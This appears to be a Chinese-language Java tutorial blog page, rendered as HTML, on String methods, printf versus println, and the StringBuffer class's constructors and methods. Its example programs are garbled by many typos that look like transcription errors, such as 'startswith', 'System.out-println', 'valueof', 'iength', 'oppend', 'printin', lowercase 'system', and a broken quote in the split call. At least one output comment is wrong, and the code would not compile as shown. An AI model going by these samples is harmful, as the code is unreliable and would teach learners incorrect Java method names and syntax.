-<p>2.</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String s = <span class="string">&quot;welcome to Java world!&quot;</span>;</span><br><span class="line">        String s1 = <span class="string">&quot;sun java&quot;</span>;</span><br><span class="line">        System.out.println(s.startswith(<span class="string">&quot;welcome&quot;</span>)); <span class="comment">//true</span></span><br><span class="line">        System.out-println(s.endswith(<span class="string">&quot;world&quot;</span>)); <span class="comment">//false</span></span><br><span class="line">        String sL = s.toLowerCase();</span><br><span class="line">        String sU = s.toUpperCase();</span><br><span class="line">        System.out.println(sL);  <span class="comment">//welcome to java world!</span></span><br><span class="line">        System.out.println(sU); <span class="comment">//wELCOMETo JAVA WORLD!</span></span><br><span class="line">        String subs = s.substring(<span class="number">11</span>);</span><br><span class="line">        System.out.println(subs); <span class="comment">//Java world!</span></span><br><span class="line">        String sp =s1.trim();</span><br><span class="line">        System.out.println(sp); <span class="comment">//sun java</span></span><br><span class="line">    &#125;                                                       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>3.</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> j = <span class="number">1234567</span>;</span><br><span class="line">		String sNumber = String.valueof(j);</span><br><span class="line">        System.out.println(<span class="string">&quot;j 是&quot;</span> + sNumber.length() + <span class="string">&quot;位数。&quot;</span>);</span><br><span class="line">        String s = <span class="string">&quot;Mary,F,1976&quot;</span>;</span><br><span class="line">		String[] sPlit = <span class="string">&#x27;s.split(”,&quot;);</span></span><br><span class="line"><span class="string">        for(int i=0; i &lt; sPlit.iength; i++)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">			System.out.println(sPlit[i]);</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">______________________________________</span></span><br><span class="line"><span class="string">    输出结果</span></span><br><span class="line"><span class="string">    	j 是7位数。</span></span><br><span class="line"><span class="string">    	Mary</span></span><br><span class="line"><span class="string">		F</span></span><br><span class="line"><span class="string">		1976</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="printf-和-println"><a href="#printf-和-println" class="headerlink" title="printf 和 println"></a>printf 和 println</h1><p>多个参数可以使用printf ，输出几进制进制用prtinf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int i, j，k;</span><br><span class="line">i &#x3D; 1;</span><br><span class="line">j &#x3D; 2;</span><br><span class="line">k &#x3D; 3;</span><br><span class="line">System.out.printf(&quot;%d的值 + %d的值 是 %d\n&quot;, i, j, k);</span><br><span class="line">System.out.printf(i + &quot;的值 +&quot; + j + &quot;的值 是&quot; + k);</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="StringBuffer类由来"><a href="#StringBuffer类由来" class="headerlink" title="StringBuffer类由来"></a>StringBuffer类由来</h1><ul>
-<li>String类对象一旦创建就不可更改</li>
-<li>如果经常对字符串内容进行修改，则使用StringBuffer.</li>
-<li><strong>如果经常对字符串内容进行修改而使用String的话，就会导致即耗空间又耗时间!</strong></li>
-<li>StringBuffer对象的内容是可以改变的</li>
-<li><strong>因此String类中没有修改字符串的方法，但是StringBuffer类中却有大量修改字符串的方法</strong></li>
-</ul>
-<h1 id="StringBuffer类的构造函数"><a href="#StringBuffer类的构造函数" class="headerlink" title="StringBuffer类的构造函数"></a>StringBuffer类的构造函数</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringBuffer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	创建一个空的没有任何字符的StringBuffer对象</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringBuffer</span><span class="params">(<span class="keyword">int</span> capacity)</span></span></span><br><span class="line"><span class="function">	创建一个不带字符，但具有指定初始容量的字符串缓冲区。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringBuffer</span><span class="params">(String str)</span></span></span><br><span class="line"><span class="function">	创建一个StringBuffer对象，包含与str对象相同的字符序列</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">例子</span></span><br><span class="line"><span class="function">   StringBuffer s </span>= <span class="keyword">new</span> StringBuffer(str);</span><br></pre></td></tr></table></figure>
-
-<p>字符串本身就是string对象</p>
-<p>例子</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestStringBuffer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        StringBuffer sb= <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        sb.append(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        sb.oppend(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;sb= &quot;</span>+ sb); <span class="comment">//sb= abc123</span></span><br><span class="line">        sb.insert(<span class="number">3</span>,<span class="string">&quot;--&quot;</span>);</span><br><span class="line">        System.out.printin(<span class="string">&quot;sb = &quot;</span> + sb); <span class="comment">//sb = abc--123</span></span><br><span class="line">        sb.delete(<span class="number">2</span>,<span class="number">6</span>); <span class="comment">//把下标从2开始到6-1结束的字符到除</span></span><br><span class="line">        System.out.println(<span class="string">&quot;sb = &quot;</span> + sb); <span class="comment">//sb = ab23</span></span><br><span class="line">        sb.reverse();</span><br><span class="line">        system.out.println(<span class="string">&quot;sb= &quot;</span> + sb); <span class="comment">//sb = 32ba</span></span><br><span class="line">        String str = sb.toString();</span><br><span class="line">        System.out.printf(<span class="string">&quot;str = &quot;</span> + str); <span class="comment">//str = 32ba</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>StringBuffer常用方法查阅手册</p>
  
       <!-- reward -->
       
